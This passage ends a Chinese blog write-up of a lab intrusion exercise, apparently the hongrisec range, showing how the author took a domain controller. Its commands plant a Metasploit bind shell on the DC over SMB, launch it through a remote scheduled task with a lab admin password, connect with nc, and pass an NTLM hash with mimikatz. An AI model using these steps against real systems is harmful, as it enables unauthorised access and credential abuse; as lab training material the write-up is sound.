+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/9e4e851d41f0373741bac9e00935588f.png"></p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/39236effd43eca613a888f372982ca81.png"></p>
+<h2 id="票据加计划任务获取DC"><a href="#票据加计划任务获取DC" class="headerlink" title="票据加计划任务获取DC"></a>票据加计划任务获取DC</h2><p>这里先用msf的命令生成正向的马 yukong.exe</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">windows/reverse_bind_tcp LHOST=<span class="number">192.168</span>.<span class="number">10.11</span> LPORT=<span class="number">7777</span></span><br></pre></td></tr></table></figure>
+<p>把马复制到域控机器上</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">copy</span> C:\\yukong.exe \\<span class="number">192.168</span>.<span class="number">52.138</span>\\c<span class="variable">$</span></span><br></pre></td></tr></table></figure>
+<p>然后再用这个写入计划任务的方法去连接，这里马反弹会连不成功，所以使用如下命令</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell schtasks /create /tn <span class="string">&quot;test&quot;</span> /tr C:\\yukong.exe /<span class="built_in">sc</span> once /st <span class="number">22</span>:<span class="number">14</span> /S <span class="number">192.168</span>.<span class="number">52.138</span> /RU System /u administrator /p <span class="string">&quot;hongrisec@2020&quot;</span></span><br></pre></td></tr></table></figure>
+<p>挂着win7代理</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxy nc <span class="literal">-vv</span> <span class="number">192.168</span>.<span class="number">52.138</span> <span class="number">7777</span></span><br></pre></td></tr></table></figure>
+<p>即可弹回DC的shell，然后清除计划任务</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /delete /s <span class="number">192.168</span>.<span class="number">52.138</span> /tn <span class="string">&quot;test&quot;</span> /f</span><br></pre></td></tr></table></figure>
+<p>使用mimikatz进行hash传递</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::pth /domain:god.org /user:administrator /ntlm:<span class="number">81</span>be2f80d568100549beac645d6a7141</span><br></pre></td></tr></table></figure>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/8687663e07fa6c7aa51ea82e9b191188.png"></p>
+<p>查看DC的目录</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">dir</span> \\<span class="number">192.168</span>.<span class="number">52.138</span>\\c<span class="variable">$</span> //<span class="built_in">dir</span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/2765c77363b9b11054fbcdba3db07cac.png"></p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>当然最后获取域控权限的方法还有很多，如pth攻击、横向哈希传递、redis等等，而其中一些地方我用的方法也不是唯一方法，如通过扫描目录发现cms进入后台写shell，用代理将win7流量转出来的方法，都很值得学习。</p>
+<p>通过这个靶场不仅锻炼了一些看过但是实战中不知道怎么使用的方法，也提升了自己独立解决问题的能力，也学到了很多新知识，如通过phpmyadmin写shell等等，用前辈说的话就是：低调求发展，潜心习安全。</p>
+<p>最近可能会把内网这部分稍微放缓一下，可能会去潜心钻研一下关于pe、win32的底层知识，希望再次回到内网学习之时，又会有新的觉悟。</p>
+
+    </article>
+    <!-- license -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://example.com">Drunkmars</a>
+            <p>原文链接：<a href="http://example.com/2021/04/09/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E5%B7%A7%E7%94%A8smb%20beacon%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/">http://example.com/2021/04/09/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E5%B7%A7%E7%94%A8smb%20beacon%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/</a>
+            <p>发表日期：<a href="http://example.com/2021/04/09/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E5%B7%A7%E7%94%A8smb%20beacon%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/">April 9th 2021, 12:00:00 am</a>
+            <p>更新日期：<a href="http://example.com/2021/04/09/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E5%B7%A7%E7%94%A8smb%20beacon%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/">June 11th 2021, 7:11:21 pm</a>
+            <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2021/04/10/windows%E8%AE%A4%E8%AF%81%E8%A7%A3%E8%AF%BB/" title="windows认证解读">
+                    <div class="nextTitle">windows认证解读</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2021/04/08/phpmyadmin%E9%A1%B5%E9%9D%A2getshell/" title="phpmyadmin页面getshell">
+                    <div class="prevTitle">phpmyadmin页面getshell</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- comment -->
+    
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+
+            
+
+            
+
+            
+
+            <!-- utteranc评论 -->
+
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+
+            
+            
+
+        </div>
+    
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    
+    <!-- Mathjax -->
+    
+</main>
+
+                <!-- profile -->
+                
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+        <div class="social">
+            
+    
+        
+            
+                <a href="mailto:drunkmars@vip.qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="https://github.com/Drunkmars" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="https://twitter.com/Drunkmars404" class="iconfont-archer twitter" target="_blank" title=twitter></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
+            
+        
+    
+
+
+        </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    
+    <!-- 不蒜子  -->
+    
+        <div class="busuanzi-container">
+            
+             
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+            
+        </div>
+    	
+</footer>
+
+        </div>
+        <!-- toc -->
+        
+            <div class="toc-wrapper toc-wrapper-loding" style=
+
+
+
+
+
+
+
+    top:50vh;
+
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E5%9C%B0%E5%9D%80%E5%88%86%E9%85%8D"><span class="toc-number">1.</span> <span class="toc-text">靶场地址分配</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">web服务器渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap%E6%8E%A2%E6%B5%8B%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.1.</span> <span class="toc-text">nmap探测端口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E5%90%8E%E5%8F%B0"><span class="toc-number">2.2.</span> <span class="toc-text">扫描后台</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87phpmyadmin%E5%86%99shell"><span class="toc-number">2.3.</span> <span class="toc-text">通过phpmyadmin写shell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text">内网信息搜集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">4.</span> <span class="toc-text">内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">4.1.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">4.2.</span> <span class="toc-text">思路</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F"><span class="toc-number">5.</span> <span class="toc-text">内网横向渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-1"><span class="toc-number">5.1.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cs%E6%B4%BE%E7%94%9Fmsf%E4%BC%9A%E8%AF%9D"><span class="toc-number">5.2.</span> <span class="toc-text">cs派生msf会话</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ms-17-010%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90"><span class="toc-number">5.3.</span> <span class="toc-text">ms_17_010获取域控权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msf%E6%89%93%E4%B8%8D%E5%87%BA%E7%BD%91%E6%9C%BA%E5%99%A8%E7%9A%84ms-17-010"><span class="toc-number">5.4.</span> <span class="toc-text">msf打不出网机器的ms_17_010</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ms-17-010%E6%A8%A1%E5%9D%97%E6%80%BB%E7%BB%93"><span class="toc-number">5.5.</span> <span class="toc-text">ms_17_010模块总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WMI%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">5.6.</span> <span class="toc-text">WMI获取域控服务器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A5%A8%E6%8D%AE%E5%8A%A0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%8E%B7%E5%8F%96DC"><span class="toc-number">5.7.</span> <span class="toc-text">票据加计划任务获取DC</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0"><span class="toc-number">6.</span> <span class="toc-text">后记</span></a></li></ol>
+            </div>
+        
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 75
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+        
+            
+            
+            <div class="archive-year"> 2088 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/08</span>
+            <a class="archive-post-title" href="/2088/08/08/readme/">README</a>
+        </li>
+    
+        
+            
+            
+                
+                </ul>
+            
+            <div class="archive-year"> 2021 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/03</span>
+            <a class="archive-post-title" href="/2021/10/03/UAC%E6%8F%90%E6%9D%83/">CVE-2019-1388 UAC提权</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/03</span>
+            <a class="archive-post-title" href="/2021/10/03/RPC%E6%8F%90%E6%9D%83/">RPC提权</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/03</span>
+            <a class="archive-post-title" href="/2021/10/03/msf%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC/">msf生成木马小结</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/03</span>
+            <a class="archive-post-title" href="/2021/10/03/nullptr/">NULL、0、nullptr 区别分析</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/17</span>
+            <a class="archive-post-title" href="/2021/07/17/%E7%BA%BF%E7%A8%8B%E5%90%8C%E6%AD%A5%E4%B8%8E%E7%BA%BF%E7%A8%8B%E4%BA%92%E6%96%A5/">线程同步与线程互斥</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/16</span>
+            <a class="archive-post-title" href="/2021/07/16/win32%E4%B8%B4%E7%95%8C%E5%8C%BA%E4%BA%92%E6%96%A5%E4%BD%93/">临界区与互斥体</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/05</span>
+            <a class="archive-post-title" href="/2021/07/05/vmtest/">一种简单的反虚拟机调试方法</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/17</span>
+            <a class="archive-post-title" href="/2021/06/17/win32/">win32</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/16</span>
+            <a class="archive-post-title" href="/2021/06/16/C++%E4%BA%8C%E5%8F%89%E6%A0%91/">C++二叉树实现</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/15</span>
+            <a class="archive-post-title" href="/2021/06/15/C++%E9%93%BE%E8%A1%A8/">C++链表实现</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/11</span>
+            <a class="archive-post-title" href="/2021/06/11/certutil%E6%8E%A2%E7%A9%B6/">certutil探究</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/10</span>
+            <a class="archive-post-title" href="/2021/06/10/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%80%BB%E7%BB%93/">横向移动总结</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/09</span>
+            <a class="archive-post-title" href="/2021/06/09/mimikatz/">从mimikatz抓取密码学习攻防</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/08</span>
+            <a class="archive-post-title" href="/2021/06/08/LLMNR%E5%92%8CNetBIOS%E6%AC%BA%E9%AA%97%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E8%8C%83/">LLMNR和NetBIOS欺骗攻击分析及防范</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/03</span>
+            <a class="archive-post-title" href="/2021/06/03/C++/">C++</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/01</span>
+            <a class="archive-post-title" href="/2021/06/01/%E7%BC%96%E5%86%99exp/">如何编写属于自己的第一个exp</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/29</span>
+            <a class="archive-post-title" href="/2021/05/29/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/">读书笔记</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/28</span>
+            <a class="archive-post-title" href="/2021/05/28/moonsec/">vulnhub靶场实战</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/27</span>
+            <a class="archive-post-title" href="/2021/05/27/5%E6%9C%88%E7%A2%8E%E7%A2%8E%E5%BF%B5/">5月碎碎念</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/26</span>
+            <a class="archive-post-title" href="/2021/05/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BC%B9shell%E7%9A%84%E5%A4%9A%E7%A7%8D%E6%96%B9%E5%BC%8F%E5%8F%8Abypass/">渗透测试中弹shell的多种方式及bypass</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/25</span>
+            <a class="archive-post-title" href="/2021/05/25/CVE-2020-1472%E8%AF%A6%E8%A7%A3/">CVE-2020-1472详解</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/23</span>
+            <a class="archive-post-title" href="/2021/05/23/%E4%BB%8E%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9%E5%88%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/">从外围打点到内网渗透拿下域控</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/19</span>
+            <a class="archive-post-title" href="/2021/05/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E5%90%91%E6%97%A5%E8%91%B5%E5%A6%99%E7%94%A8/">内网渗透之向日葵妙用</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/12</span>
+            <a class="archive-post-title" href="/2021/05/12/Dedecms%EF%BC%88%E7%BB%87%E6%A2%A6cms%EF%BC%89/">Dedecms(织梦cms)漏洞分析及复现</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/12</span>
+            <a class="archive-post-title" href="/2021/05/12/EmpireCMS%EF%BC%88%E5%B8%9D%E5%9B%BDcms%EF%BC%89/">Empirecms(帝国cms)漏洞分析及复现</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/11</span>
+            <a class="archive-post-title" href="/2021/05/11/CVE-2020-0796%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/">CVE-2020-0796分析及利用</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/11</span>
+            <a class="archive-post-title" href="/2021/05/11/MS17_010%E6%A3%80%E6%B5%8B%E5%8F%8A%E6%89%93%E6%B3%95/">MS17_010检测及打法</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/11</span>
+            <a class="archive-post-title" href="/2021/05/11/%E6%9C%A8%E9%A9%AC%E8%A7%A3%E6%9E%90&disable_fuctions/">木马解析&disable_fuctions</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/11</span>
+            <a class="archive-post-title" href="/2021/05/11/%E7%AC%AC%E4%B8%80%E6%AC%A1hvv%E6%80%BB%E7%BB%93/">第一次hvv总结</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/08</span>
+            <a class="archive-post-title" href="/2021/05/08/jboss%E4%B9%8BJMXInvokerServlet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8/">jboss之JMXInvokerServlet反序列化漏洞分析利用</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/08</span>
+            <a class="archive-post-title" href="/2021/05/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E7%9A%84n%E7%A7%8D%E5%A7%BF%E5%8A%BF/">内网穿透的n种姿势</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/06</span>
+            <a class="archive-post-title" href="/2021/05/06/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0bypass%E5%AE%89%E5%85%A8%E7%8B%97/">文件上传bypass安全狗</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/28</span>
+            <a class="archive-post-title" href="/2021/04/28/cs%E5%8A%A0%E8%BD%BD%E5%AE%8F%E4%B8%8A%E7%BA%BF%E5%88%9D%E6%8E%A2/">cs加载宏上线初探</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/27</span>
+            <a class="archive-post-title" href="/2021/04/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BDPAPI%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/">内网渗透之DPAPI机制学习</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/20</span>
+            <a class="archive-post-title" href="/2021/04/20/%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E7%9A%84%E5%88%9B%E5%BB%BA%E5%92%8C%E4%BD%BF%E7%94%A8/">隐藏用户的创建和使用</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/19</span>
